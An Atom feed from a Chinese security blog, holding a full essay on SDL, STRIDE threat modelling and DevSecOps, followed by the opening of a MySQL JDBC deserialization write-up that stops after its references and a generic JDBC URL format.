<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2021-05-29T08:19:11.963Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅谈SDL与DevSecOps</title>
    <link href="https://www.mi1k7ea.com/2021/05/16/%E6%B5%85%E8%B0%88SDL%E4%B8%8EDevSecOps/"/>
    <id>https://www.mi1k7ea.com/2021/05/16/浅谈SDL与DevSecOps/</id>
    <published>2021-05-16T07:02:36.000Z</published>
    <updated>2021-05-29T08:19:11.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这里仅谈谈个人对安全研发（SDL）和安全DevOps（DevSecOps）的理解及相关思考，但由于缺乏DevSecOps实践经验因此这块无法详细畅谈。</p><h2 id="0x01-从企业的安全建设说起"><a href="#0x01-从企业的安全建设说起" class="headerlink" title="0x01 从企业的安全建设说起"></a>0x01 从企业的安全建设说起</h2><p>任何企业都是以业务为重。当企业的业务发展受制于安全的时候，此时企业就会考虑往安全方面投入了。比如，某公司被脱裤导致用户信息泄露之后，才开始成立自己的安全部来推动安全保障业务。</p><p>在早期的一些投入安全整改的企业中，很多企业一般都是每年花钱来请乙方安全厂商来做渗透测试、安全评估扫描等等，然后看看安全报告、推动修补相应的漏洞就了事了。但是到后来发现，这样每年给钱乙方搞安全还不如自己招那么几个安全工程师成立自己的安全部来得划算。因此，“一个人的安全部”就在这样的一些背景下产生了。这样的安全部往往人不多，但是负责安全方面的工作却比较多，从渗透测试、漏洞认领复现、安全开发、与开发扯皮、应急响应、安全运维…等等，其中个人认为于企业而言性价比最高的当然就是安全开发，企业如果购买安全厂商产品的话成本是很高的，但是如果自己招几个安全工程师搞下安全开发、搞一些如WAF、漏洞扫描器、IDS和IPS等产品，这就省了很多成本，到后期安全产品成熟了、也就变成了养那么几个安全工程师或者无须有的事情了。</p><p>当然，对于大厂而言，往往都会组建人数不少的安全部甚至每个产品线都组建自己的安全部来负责自己的产品安全，侧重点在于挖洞和修洞这两块。但是到后面，随着业务的发展，版本迭代越来越迅速，软件开发模型也变换甚多。此时，企业如果还只是纯粹地做渗透测试和安全风险评估，必然无法保障如此多版本的安全性，同时由于挖出的漏洞已处于产品“定型”阶段、导致漏洞的修复成本会非常高，这时国内企业又寻求新的变更点、学习微软的SDL，即<strong>将安全前置、使产品开发的每个阶段都融入安全活动、提高产品安全性并大大降低安全问题导致的修复成本</strong>。</p><h2 id="0x02-SDL"><a href="#0x02-SDL" class="headerlink" title="0x02 SDL"></a>0x02 SDL</h2><h3 id="SDL简介"><a href="#SDL简介" class="headerlink" title="SDL简介"></a>SDL简介</h3><p>SDL全称Security Development Lifecycle，即安全开发生命周期，是由微软提出并应用的一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程。</p><p>SDL的核心理念就是将安全考虑集成在软件开发的每一个阶段：需求分析、设计、编码、测试和维护。从需求、设计到发布产品的每一个阶段每都增加了相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。</p><h3 id="SDL、SDLC和S-SDLC"><a href="#SDL、SDLC和S-SDLC" class="headerlink" title="SDL、SDLC和S-SDLC"></a>SDL、SDLC和S-SDLC</h3><p>SDL：Security Development Lifecycle，安全开发生命周期；</p><p>SDLC：Software Development Life Cycle，软件开发生命周期；</p><p>S-SDLC：Secure Software Development Life Cycle，安全软件开发生命周期，是由开源Web安全组织OWASP推出的一个项目，它跟SDL的区别是它更关注的是SDL的落地化；</p><h3 id="SDL相关人员角色"><a href="#SDL相关人员角色" class="headerlink" title="SDL相关人员角色"></a>SDL相关人员角色</h3><p>微软SDL中给出如下角色定义：</p><ul><li><strong>评析者/顾问角色</strong>：这些角色的任务是对项目安全和隐私进行监督，有权接受或拒绝项目团队的安全和隐私计划。<ul><li>安全顾问/隐私顾问。这些角色由项目团队外部的主题专家 (SME) 担任。该角色可以由组织中专门进行此类评析的独立集中小组中的合格成员担任，也可以由组织外部的专家担任。为此任务选择的人员必须担任两个子角色：<ul><li>审计官。此角色必须监控软件开发过程的每个阶段，并证明每个安全要求的成功实现。审计官必须能够自主证明过程是否符合安全和隐私要求方面的要求，而不受项目团队的干扰。</li><li>专家。为顾问角色选择的人员必须在安全方面拥有可靠的相关专业知识。</li></ul></li><li>顾问角色组合。如果可以确认某人具有合适的技能和经验，则安全顾问的角色可以与隐私顾问的角色合二为一。</li></ul></li><li><strong>团队负责人</strong>。团队负责人角色应由项目团队的主题专家担任。这些角色负责协商、接受和跟踪最低安全和隐私要求，并在软件开发项目过程中与顾问和决策者保持通畅的沟通渠道。<ul><li>安全负责人/隐私负责人。此角色（一人或多人）不仅负责确保软件发布解决了所有安全问题，还负责协调和跟踪项目的安全问题。此角色还负责向安全顾问和项目团队的其他相关方（例如，开发和测试负责人）报告情况。</li><li>角色组合。与安全和隐私顾问角色一样，如果可以确认某人具有合适的技能和经验，则可以由一人承担负责人角色的职责。</li></ul></li></ul><h3 id="SDL安全活动"><a href="#SDL安全活动" class="headerlink" title="SDL安全活动"></a>SDL安全活动</h3><p>从Microsoft SDL看起，这是一组必需的安全活动，这些活动的执行顺序与其显示顺序相同，按传统软件开发生命周期 (SDLC) 的阶段分组：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/3.png" alt=""></p><p>如上图列出的是SDL中必须进行的安全活动。下面来看下各个阶段的安全活动。</p><h4 id="必须的安全活动"><a href="#必须的安全活动" class="headerlink" title="必须的安全活动"></a>必须的安全活动</h4><h5 id="SDL执行前：安全培训"><a href="#SDL执行前：安全培训" class="headerlink" title="SDL执行前：安全培训"></a>SDL执行前：安全培训</h5><p>在SDL执行之前，需要给研发团队进行相关的安全培训，包括但不限于以下内容。当然，个人认为对产品线研发团队的安全培训并不只是限于SDL执行之前、而是针对各个阶段都要进行。</p><ul><li>安全设计，包括以下主题：<ul><li>减小攻击面</li><li>深度防御</li><li>最小权限原则</li><li>安全默认设置</li></ul></li><li>威胁建模，包括以下主题：<ul><li>威胁建模概述</li><li>威胁模型的设计意义</li><li>基于威胁模型的编码约束</li></ul></li><li>安全编码，包括以下主题：<ul><li>缓冲区溢出（对于使用 C 和 C++ 的应用程序）</li><li>整数算法错误（对于使用 C 和 C++ 的应用程序）</li><li>跨站点脚本（对于托管代码和 Web 应用程序）</li><li>SQL 注入（对于托管代码和 Web 应用程序）</li></ul></li><li>弱加密安全测试，包括以下主题：<ul><li>安全测试与功能测试之间的区别</li><li>风险评估</li><li>安全测试方法</li></ul></li><li>隐私，包括以下主题：<ul><li>隐私敏感数据的类型</li><li>隐私设计最佳实践</li><li>风险评估</li><li>隐私开发最佳实践</li><li>隐私测试最佳实践</li></ul></li></ul><h5 id="第一阶段：要求"><a href="#第一阶段：要求" class="headerlink" title="第一阶段：要求"></a>第一阶段：要求</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>安全要求：“预先”考虑安全和隐私是开发安全系统过程的基础环节。为软件项目定义信任度要求的最佳时间是在初始计划阶段。尽早定义要求有助于开发团队确定关键里程碑和交付成果，并使集成安全和隐私的过程尽量不影响到计划和安排。对安全和隐私要求的分析在项目初期执行，所做工作涉及为设计在计划运行环境中运行的应用程序确定最低安全要求，并确立和部署安全漏洞/工作项跟踪系统。</li><li>质量门/Bug栏：用于确立安全和隐私质量的最低可接受级别。</li><li>安全和隐私风险评估：安全风险评估 (SRA) 和隐私风险评估 (PRA) 是必需的过程，用于确定软件中需要深入评析的功能环节。这些评估必须包括以下信息：<ul><li>（安全）项目的哪些部分在发布前需要威胁模型？</li><li>（安全）项目的哪些部分在发布前需要进行安全设计评析？</li><li>（安全）项目的哪些部分（如果有）需要由不属于项目团队且双方认可的小组进行渗透测试？</li><li>（安全）是否存在安全顾问认为有必要增加的测试或分析要求以缓解安全风险？</li><li>（安全）模糊测试要求的具体范围是什么？</li><li>（隐私）隐私影响评级如何？</li></ul></li></ul><h5 id="第二阶段：设计"><a href="#第二阶段：设计" class="headerlink" title="第二阶段：设计"></a>第二阶段：设计</h5><p>SDL安全设计的6个核心原则：</p><ul><li>Attack Surface Reduction（攻击面最小化）</li><li>Basic Privacy（基本隐私）</li><li>Least Privilege（权限最小化）</li><li>Secure Defaults（默认安全）</li><li>Defense in Depth（纵深防御）</li><li>Threat Modeling（威胁建模）</li></ul><h5 id="第三阶段：实施"><a href="#第三阶段：实施" class="headerlink" title="第三阶段：实施"></a>第三阶段：实施</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>使用批准的工具：所有开发团队都应定义并发布获准工具及其关联安全检查的列表，如编译器/链接器选项和警告。此列表应由项目团队的安全顾问进行批准。一般而言，开发团队应尽量使用最新版本的获准工具，以利用新的安全分析功能和保护措施。</li><li>弃用不安全的函数：许多常用函数和 API 在当前威胁环境下并不安全。项目团队应分析将与软件开发项目结合使用的所有函数和 API，并禁用确定为不安全的函数和 API。确定禁用列表之后，项目团队应使用头文件（如 banned.h 和 strsafe.h）、较新的编译器或代码扫描工具来检查代码（在适当情况下还包括旧代码）中是否存在禁用函数，并使用更安全的备选函数替代这些禁用函数。</li><li>静态代码分析：项目团队应对源代码执行静态分析。源代码静态分析为安全代码评析提供了伸缩性，可以帮助确保对安全代码策略的遵守。静态代码分析本身通常不足以替代人工代码评析。安全团队和安全顾问应了解静态分析工具的优点和缺点，并准备好根据需要为静态分析工具辅以其他工具或人工评析。</li></ul><h5 id="第四阶段：验证"><a href="#第四阶段：验证" class="headerlink" title="第四阶段：验证"></a>第四阶段：验证</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>动态程序分析：为确保程序功能按照设计方式工作，有必要对软件程序进行运行时验证。此验证任务应指定一些工具，用以监控应用程序行为是否存在内存损坏、用户权限问题以及其他重要安全问题。SDL 过程使用运行时工具（如 AppVerifier）以及其他方法（如模糊测试）来实现所需级别的安全测试覆盖率。</li><li>模糊测试：模糊测试是一种专门形式的动态分析，它通过故意向应用程序引入不良格式或随机数据诱发程序故障。模糊测试策略的制定以应用程序的预期用途以及应用程序的功能和设计规范为基础。安全顾问可能要求进行额外的模糊测试或扩大模糊测试的范围和增加持续时间。</li><li>威胁模型和攻击面评审：应用程序经常会严重偏离在软件开发项目要求和设计阶段所制定的功能和设计规范。因此，在给定应用程序完成编码后重新评析其威胁模型和攻击面度量是非常重要的。此评析可确保考虑到对系统设计或实现方面所做的全部更改，并确保因这些更改而形成的所有新攻击平台得以评析和缓解。</li></ul><h5 id="第五阶段：发布"><a href="#第五阶段：发布" class="headerlink" title="第五阶段：发布"></a>第五阶段：发布</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>事件响应计划：受SD 要求约束的每个软件发布都必须包含事件响应计划。即使在发布时不包含任何已知漏洞的程序也可能面临日后新出现的威胁。事件响应计划应包括：<ul><li>单独指定的可持续工程 (SE) 团队；或者，如果团队太小以至于无法拥有 SE 资源，则应制定紧急响应计划 (ERP)，在该计划中确定相应的工程、市场营销、通信和管理人员充当发生安全紧急事件时的首要联系点。</li><li>与决策机构的电话联系（7 x 24 随时可用）。</li><li>针对从组织中其他小组继承的代码的安全维护计划。</li><li>针对获得许可的第三方代码的安全维护计划，包括文件名、版本、源代码、第三方联系信息以及要更改的合同许可（如果适用）。</li></ul></li><li>最终安全评审：最终安全评析 (FSR) 是在发布之前仔细检查对软件应用程序执行的所有安全活动。FSR 由安全顾问在普通开发人员以及安全和隐私团队负责人的协助下执行。FSR 不是“渗透和修补”活动，也不是用于执行以前忽略或忘记的安全活动的时机。FSR 通常要根据以前确定的质量门或 Bug 栏检查威胁模型、异常请求、工具输出和性能。</li><li>发布/存档：指派负责发布事宜的安全顾问必须证明（使用 FSR 和其他数据）项目团队已满足安全要求。此外，必须对所有相关信息和数据进行存档，以便可以对软件进行发布后维护。这些信息和数据包括所有规范、源代码、二进制文件、专用符号、威胁模型、文档、紧急响应计划、任何第三方软件的许可证和服务条款以及执行发布后维护任务所需的任何其他数据。</li></ul><h5 id="发布后：响应"><a href="#发布后：响应" class="headerlink" title="发布后：响应"></a>发布后：响应</h5><p>产品在发布后的安全应急响应是必须要做的。</p><h4 id="可选的安全活动"><a href="#可选的安全活动" class="headerlink" title="可选的安全活动"></a>可选的安全活动</h4><p>可选的安全活动是需要专业的安全团队来完成的</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>尽管前面有静态代码分析的实践，但是都是基于使用静态代码扫描工具扫描的形式来进行的，其中可能会存在更多的安全代码问题比如业务逻辑漏洞、0day等是工具扫描不出来的，此时就需要专业的安全团队进行人工代码审计，从而进一步提高产品的安全性。</p><h5 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h5><p>渗透测试通过和代码审计一起完成的，侧重在模拟外部黑客来从外部进行黑/灰盒渗透测试，以黑客的视角来发现产品安全问题。</p><h5 id="相似产品的漏洞分析"><a href="#相似产品的漏洞分析" class="headerlink" title="相似产品的漏洞分析"></a>相似产品的漏洞分析</h5><p>专业安全团队通过分析友商或其他相似产品历史出现过的漏洞，再审计当前产品是否存在相似的漏洞，借助其他产品的经验来修补已知的安全问题。</p><h3 id="Threat-Modeling（威胁建模）"><a href="#Threat-Modeling（威胁建模）" class="headerlink" title="Threat Modeling（威胁建模）"></a>Threat Modeling（威胁建模）</h3><p>威胁建模是SDL流程中的核心组成部分，是一种可以用来帮助开发人员与SDL工程师提前识别可能影响到应用的威胁、攻击、漏洞和对策。使用威胁建模来完成产品的设计，可以有效满足企业的安全目标并降低安全风险。</p><p>微软中提到威胁建模的5个关键步骤如下：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/1.png" alt=""></p><ol><li>定义安全需求</li><li>创建应用图解</li><li>识别威胁</li><li>缓解威胁</li><li>验证威胁是否已缓解</li></ol><p>在进行威胁建模分析上，微软还提供了专用于威胁建模的工具Microsoft Threat Modeling Tool，工具下载地址：<a href="https://aka.ms/threatmodelingtool" target="_blank" rel="noopener">https://aka.ms/threatmodelingtool</a></p><p>威胁建模也是有方法的，就是STRIDE方法。</p><h3 id="STRIDE"><a href="#STRIDE" class="headerlink" title="STRIDE"></a>STRIDE</h3><p>STRIDE威胁建模是由微软提出的一种威胁建模方法，该方法将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄漏）、Denial of Service（拒绝服务）和 Elevation of Privilege（权限提升）。STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题。</p><p>相关概念解释如下表：</p><table><thead><tr><th>威胁</th><th>定义</th><th>对应的安全属性</th></tr></thead><tbody><tr><td>Spoofing</td><td>冒充他人身份</td><td>认证</td></tr><tr><td>Tampering</td><td>修改数据或代码</td><td>完整性</td></tr><tr><td>Repudiation</td><td>否认做过的事</td><td>不可抵赖性</td></tr><tr><td>Information  Disclosure</td><td>机密信息泄露</td><td>机密性</td></tr><tr><td>Denial  of Service</td><td>拒绝服务</td><td>可用性</td></tr><tr><td>Elevation  of Privilege</td><td>未经授权获得许可</td><td>授权</td></tr></tbody></table><p>STRIDE威胁建模流程和前面介绍的一样：</p><ul><li>绘制数据流图</li><li>识别威胁</li><li>提出缓解措施</li><li>安全验证</li></ul><p><img src="/2021/05/16/浅谈SDL与DevSecOps/4.png" alt=""></p><h4 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h4><p>数据流图（Data Flow Diagrams）包含外部实体（External Entity）、处理过程（Process）、数据流（Data Flow）、数据存储（Data Store）：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/7.png" alt=""></p><p>安全人员与系统架构师及设计人员沟通，了解设计详情并画出数据流图后还需要标注信任边界（Trust Boundary），当然也可以通过赋能架构师与开发人员来自行画出数据流图让安全人员评审。</p><p>网上一个简单的Web应用数据流图如下，注意要用红色虚拟隔离出信任边界：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/5.png" alt=""></p><p>为了规范，是需要用到上面提到的Microsoft Threat Modeling Tool这个工具来描绘数据流图的，具体绘图细节这里不多说，看个网上的工具范例：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/6.png" alt=""></p><h4 id="识别威胁"><a href="#识别威胁" class="headerlink" title="识别威胁"></a>识别威胁</h4><p>STRIDE威胁建模方法已经明确了每个数据流图元素具有不同的威胁，其中外部实体只有仿冒（S）、抵赖（R）威胁，数据流只有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，处理过程有所有六种（STRIDE）威胁，存储过程有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，但如果是日志类型存储则还有抵赖（R）威胁。具体可以对照如下表格进行威胁识别：</p><table><thead><tr><th style="text-align:center"><strong>元素</strong></th><th style="text-align:center"><strong>S</strong></th><th style="text-align:center"><strong>T</strong></th><th style="text-align:center"><strong>R</strong></th><th style="text-align:center"><strong>I</strong></th><th style="text-align:center"><strong>D</strong></th><th style="text-align:center"><strong>E</strong></th></tr></thead><tbody><tr><td style="text-align:center">外部实体</td><td style="text-align:center">√</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">处理过程</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr><tr><td style="text-align:center">数据存储</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center">？</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">数据流</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr></tbody></table><h4 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h4><p>识别到威胁之后，就要针对某一项危险提出对应的缓解措施。注意，这里之所以是缓解而不是消除，是因为大多数时候由于业务功能导致很多威胁是无法根除的。</p><p>微软对于常用的威胁给出了其常用的标准缓解措施，并在具体实施时已将常用的缓解方案及措施集成为独立的解决方案或者代码模块。可以方便同类应用直接使用。</p><table><thead><tr><th style="text-align:center"><strong>威胁类型</strong></th><th style="text-align:center"><strong>缓解措施</strong></th><th style="text-align:center"><strong>技术方案</strong></th></tr></thead><tbody><tr><td style="text-align:center">仿冒(S)</td><td style="text-align:center">认证</td><td style="text-align:center">Kerberos认证PKI系统如SSL / TLS证书数字签名</td></tr><tr><td style="text-align:center">篡改(T)</td><td style="text-align:center">完整性保护</td><td style="text-align:center">访问控制完整性校验</td></tr><tr><td style="text-align:center">抵赖(R)</td><td style="text-align:center">日志审计</td><td style="text-align:center">强认证安全日志、审计</td></tr><tr><td style="text-align:center">信息泄露(I)</td><td style="text-align:center">保密性</td><td style="text-align:center">加密访问控制列表</td></tr><tr><td style="text-align:center">拒绝服务(D)</td><td style="text-align:center">可用性</td><td style="text-align:center">访问控制列表过滤热备份</td></tr><tr><td style="text-align:center">权限提升(E)</td><td style="text-align:center">授权认证</td><td style="text-align:center">输入校验用户组管理访问控制列表</td></tr></tbody></table><h4 id="安全验证"><a href="#安全验证" class="headerlink" title="安全验证"></a>安全验证</h4><p>在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合预期设计，所有的威胁是否都有相应的缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。</p><h2 id="0x03-DevSecOps"><a href="#0x03-DevSecOps" class="headerlink" title="0x03 DevSecOps"></a>0x03 DevSecOps</h2><h3 id="软件开发模型的演进"><a href="#软件开发模型的演进" class="headerlink" title="软件开发模型的演进"></a>软件开发模型的演进</h3><p>在说到DevSecOps之前就必须先了解下软件开发模型的主要演进过程。</p><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>在传统的软件开发模型中，最常用的就是瀑布模型（Waterfall Model）。</p><p>瀑布模型是严格把软件项目的开发分隔成各个开发阶段，使用里程碑的方式，严格定义了各开发阶段的输入和输出。如果达不到要求的输出，下一阶段的工作就不展开。</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/8.png" alt=""></p><h4 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h4><p>传统的瀑布模型是没法满足日新月异的业务需求变化的，此时就出现了敏捷开发模型。</p><p>敏捷软件开发（Agile software development），又称敏捷开发，是一种从1990年代开始逐渐引起广泛关注的一些新型软件开发方法，是一种应对快速变化的需求的一种软件开发能力。它们的具体名称、理念、过程、术语都不尽相同，相对于“非敏捷”，更强调程序员团队与业务专家之间的紧密协作、面对面的沟通（认为比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好地适应需求变化的代码编写和团队组织方法，也更注重软件开发过程中人的作用。</p><p>敏捷开发的核心是迭代。</p><p>如图，可以明显看到两者的区别：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/9.png" alt=""></p><p>可以看到，敏捷开发是将分析、设计、编码和测试等阶段作为迭代的部分来进行迭代开发的。但是，这只是开发流程的快速优化，运维流程并不在其中，也就是说在瀑布或敏捷模型中都是要开发流程走完才能到达运维人员负责后续的运维阶段（Operations）的工作，这就导致业务不能提供更快速稳定的交付了。此时，DevOps应运而生。</p><h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h4><h5 id="DevOps简介"><a href="#DevOps简介" class="headerlink" title="DevOps简介"></a>DevOps简介</h5><p>DevOps并无权威官方的描述定义，这里引用维基百科的：</p><blockquote><p><strong>DevOps</strong>（<strong>Dev</strong>elopment和<strong>Op</strong>erations的组合词）是一种重视“软件开发人员（Dev）”和“IT运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。透过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。</p></blockquote><p>可以把DevOps看作开发（软件工程）、技术运营和质量保障（QA）三者的交集：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/2.png" alt=""></p><p>DevOps强调的是高效组织团队之间如何通过自动化的工具协作和沟通来完成软件的生命周期管理，从而更快、更频繁地交付更稳定的软件。</p><h5 id="DevOps生命周期"><a href="#DevOps生命周期" class="headerlink" title="DevOps生命周期"></a>DevOps生命周期</h5><p>DevOps的生命周期如图，是个循环的、开发与运维各阶段活动集成的：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/10.png" alt=""></p><h5 id="概念对比"><a href="#概念对比" class="headerlink" title="概念对比"></a>概念对比</h5><p>这里引用腾讯安全云鼎实验室的图，一目了然这几种软件开发模型之间的区别：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/11.png" alt=""></p><p>如上图所示，部署操作并不是等到最后才进行、而是和开发测试操作一同迭代进行的。</p><h5 id="DevOps做法"><a href="#DevOps做法" class="headerlink" title="DevOps做法"></a>DevOps做法</h5><p>DevOps做法如下：</p><ul><li>持续集成和持续交付（CI/CD）</li><li>版本控制</li><li>敏捷软件开发</li><li>基础结构即代码</li><li>配置管理</li><li>持续监视</li></ul><h5 id="给SDL带来的挑战"><a href="#给SDL带来的挑战" class="headerlink" title="给SDL带来的挑战"></a>给SDL带来的挑战</h5><p>SDL是将安全考虑集成在软件开发的每一个阶段、为每一个开发阶段添加对应的安全活动，是基于产品发布上线前进行的一系列安全活动，这种模式在瀑布模型和敏捷开发中是适用的。但是到了DevOps后，SDL就显得相形见绌了，主要在于DevOps的快速持续集成、持续交付、持续部署等特性和SDL执行的流水线式缓慢过程是互相冲突的，这就使得安全拖慢了DevOps。</p><p>基于此，Gartner在2012年就提出了DevSecOps来解决安全DevOps问题。</p><h3 id="DevSecOps简介"><a href="#DevSecOps简介" class="headerlink" title="DevSecOps简介"></a>DevSecOps简介</h3><p>DevSecOps，全称Development Security Operations，是一套有Gartner提出的基于DevOps体系的全新IT安全实践战略框架，是一种旨在将安全性嵌入DevOps链条中的每个部分新方法，它有助于在开发过程早期而不是产品发布后识别安全问题，目标是让每个人对信息安全负责，而不仅仅是安全部门。</p><p>相比于SDL，DevSecOps已不只是关注开发阶段的安全，而是需要将安全嵌入到开发和运维的整个DevOps的生命周期中。</p><p>在之前，安全只是特定团队的职责，是在开发的最后阶段才会介入的：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/13.png" alt=""></p><p>这种方式显然会拖累DecOps的高效性，因此DevSecOps提出的概念就是，安全是整个IT团队的共同职责，人人为安全负责，人人参与安全：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/14.png" alt=""></p><p>广义上的DevOps的建设会包含：人、流程、工具等多方面内容。</p><p>因此，DevSecOps 意味着从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择合适的工具来持续集成安全防护（比如在集成开发环境（IDE）中集成安全防护功能）有助于实现这些目标。但是高效的 DevOps 安防需要的不仅是新工具。它更需要整个公司实现 DevOps 文化变革，从而尽早集成安全团队的工作。</p><h3 id="DevSecOps架构图"><a href="#DevSecOps架构图" class="headerlink" title="DevSecOps架构图"></a>DevSecOps架构图</h3><p>DevSecOps架构图如下：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/12.png" alt=""></p><h3 id="从SDL到DevSecOps的变化"><a href="#从SDL到DevSecOps的变化" class="headerlink" title="从SDL到DevSecOps的变化"></a>从SDL到DevSecOps的变化</h3><p>个人理解，DevSecOps就是SDL针对DecOps的快速优化版，两者并非是完全不同的东西，而是针对迭代快速的业务进行的优化：</p><ul><li>安全文化普及，强调每个人都对安全负责；</li><li>更多的自动化实现，摒弃SDL中过多的人工参与；</li><li>融入整个开发与运维流程中，而不是只嵌入开发流程；</li><li>使得安全活动更为前置；</li></ul><h3 id="DevSecOps实践"><a href="#DevSecOps实践" class="headerlink" title="DevSecOps实践"></a>DevSecOps实践</h3><p>这块尚未接触，写了也是纸上谈兵，后续如果接触到DevSecOps实践这块再补充。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.fooying.com/from_sdl_to_devsecops_security_in_dev/" target="_blank" rel="noopener">从SDL到DevSecOps：始终贯穿开发生命周期的安全</a></p><p><a href="https://www.microsoft.com/en-us/securityengineering/sdl/" target="_blank" rel="noopener">Microsoft Security Development Lifecycle</a></p><p><a href="http://blog.nsfocus.net/sdl/" target="_blank" rel="noopener">【软件安全设计】安全开发生命周期（SDL）</a></p><p><a href="https://azure.microsoft.com/zh-cn/overview/what-is-devops/" target="_blank" rel="noopener">什么是 DevOps？</a></p><p><a href="https://www.redhat.com/zh/topics/devops/what-is-devsecops" target="_blank" rel="noopener">什么是 DevSecOps?</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="SDL&amp;DevSecOps" scheme="https://www.mi1k7ea.com/categories/SDL-DevSecOps/"/>
    
    
      <category term="DevSecOps" scheme="https://www.mi1k7ea.com/tags/DevSecOps/"/>
    
      <category term="SDL" scheme="https://www.mi1k7ea.com/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL JDBC反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC反序列化漏洞/</id>
    <published>2021-04-23T04:33:08.000Z</published>
    <updated>2021-04-25T14:41:30.974Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>HW期间遇到这个洞，研究研究。</p><p>参考：</p><ul><li><a href="https://xz.aliyun.com/t/8159" target="_blank" rel="noopener">小白看得懂的MySQL JDBC 反序列化漏洞分析</a></li><li><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">MySQL JDBC 客户端反序列化漏洞分析</a></li><li><a href="https://paper.seebug.org/1227/" target="_blank" rel="noopener">MySQL JDBC 客户端反序列化漏洞</a></li></ul><h2 id="0x01-MySQL-JDBC反序列化漏洞"><a href="#0x01-MySQL-JDBC反序列化漏洞" class="headerlink" title="0x01 MySQL JDBC反序列化漏洞"></a>0x01 MySQL JDBC反序列化漏洞</h2><h3 id="JDBC简介"><a href="#JDBC简介" class="headerlink" title="JDBC简介"></a>JDBC简介</h3><p>JDBC（Java DataBase Connectivity）即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</p><p>一般格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc://driver://host:port/database?配置name1=配置Value1&amp;配置name2=配置Value2</span><br></pre></td></tr></table></figure><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" 